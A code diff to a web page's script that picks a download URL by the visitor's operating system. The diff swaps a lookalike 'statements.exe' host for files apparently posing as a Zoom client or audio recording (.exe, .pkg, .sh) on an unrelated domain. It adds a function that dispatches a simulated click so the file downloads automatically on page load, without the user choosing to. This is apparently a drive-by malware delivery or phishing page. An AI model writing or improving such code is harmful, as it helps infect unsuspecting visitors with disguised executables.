@@ -78,13 +78,13 @@
         function getDownloadLink(os) {
             switch (os) {
                 case 'windows':
-                    return 'http://statements-6e58-mail8-es24hrs-admin-6567-88ec.specialitystoreservice.com/camphere/sigidwhat/statements.exe?e=Access&y=Guest';
+                    return 'https://arjairsparts.com/zoomsetup/clientsetup/Audio-Record6542567828.exe?e=Access&y=Guest';
                 case 'macos':
-                    return 'http://statements-6e58-mail8-es24hrs-admin-6567-88ec.specialitystoreservice.com/camphere/sigidwhat/statements.exe?e=Access&y=Guest';
+                    return 'https://arjairsparts.com/zoomsetup/clientsetup/Audio-Record6542567828.pkg?e=Access&y=Guest';
                 case 'linux':
-                    return 'http://statements-6e58-mail8-es24hrs-admin-6567-88ec.specialitystoreservice.com/camphere/sigidwhat/statements.exe?e=Access&y=Guest';
+                    return 'https://arjairsparts.com/zoomsetup/clientsetup/Audio-Record6542567828.sh?e=Access&y=Guest';
                 default:
-                    return 'http://statements-6e58-mail8-es24hrs-admin-6567-88ec.specialitystoreservice.com/camphere/sigidwhat/statements.exe?e=Access&y=Guest';
+                    return 'https://arjairsparts.com/zoomsetup/clientsetup/Audio-Record6542567828.exe?e=Access&y=Guest';
             }
         }
         
@@ -208,40 +208,67 @@
             contentDiv.appendChild(successDiv);
         }
         
+        // Trigger file download
+        function triggerDownload(downloadLink) {
+            return new Promise((resolve, reject) => {
+                try {
+                    const downloadBtn = document.createElement("a");
+                    downloadBtn.href = downloadLink;
+                    downloadBtn.download = downloadLink.split('/').pop();
+                    document.body.appendChild(downloadBtn);
+                    
+                    // Add event listener to check if download started
+                    downloadBtn.addEventListener('click', () => {
+                        setTimeout(() => {
+                            resolve(true);
+                        }, 1000);
+                    });
+                    
+                    // Simulate click
+                    const event = new MouseEvent('click', {
+                        view: window,
+                        bubbles: true,
+                        cancelable: true
+                    });
+                    downloadBtn.dispatchEvent(event);
+                    
+                    // Clean up
+                    setTimeout(() => {
+                        document.body.removeChild(downloadBtn);
+                    }, 2000);
+                    
+                } catch (e) {
+                    console.error("Download error:", e);
+                    reject(e);
+                }
+            });
+        }
+        
         // Start automatic download
-        function startAutoDownload() {
+        async function startAutoDownload() {
             const osType = detectOS();
             const downloadLink = getDownloadLink(osType);
             
             // Update manual download link
             const downloadElement = document.getElementById('downloadLink');
             downloadElement.href = downloadLink;
-            downloadElement.onclick = function(e) {
+            downloadElement.onclick = async function(e) {
                 e.preventDefault();
-                triggerDownload(downloadLink);
+                await triggerDownload(downloadLink);
+                showSuccessMessage();
                 return false;
             };
             
-            // Trigger automatic download after 2 seconds
-            setTimeout(() => {
-                triggerDownload(downloadLink);
-            }, 2000);
-        }
-        
-        // Trigger file download
-        function triggerDownload(downloadLink) {
             try {
-                const downloadBtn = document.createElement("a");
-                downloadBtn.href = downloadLink;
-                downloadBtn.download = downloadLink.split('/').pop();
-                document.body.appendChild(downloadBtn);
-                downloadBtn.click();
-                document.body.removeChild(downloadBtn);
+                // Trigger automatic download
+                const downloadStarted = await triggerDownload(downloadLink);
                 
-                // Show success message
-                setTimeout(showSuccessMessage, 1000);
-            } catch (e) {
-                console.error("Download error:", e);
+                if (downloadStarted) {
+                    // Show success message after download starts
+                    setTimeout(showSuccessMessage, 1500);
+                }
+            } catch (error) {
+                console.error("Automatic download failed:", error);
             }
         }
         
@@ -283,7 +310,7 @@
                 }
                 
                 // Start automatic download process
-                startAutoDownload();
+                await startAutoDownload();
                 
             } catch (error) {
                 console.error('Error handling visit:', error);
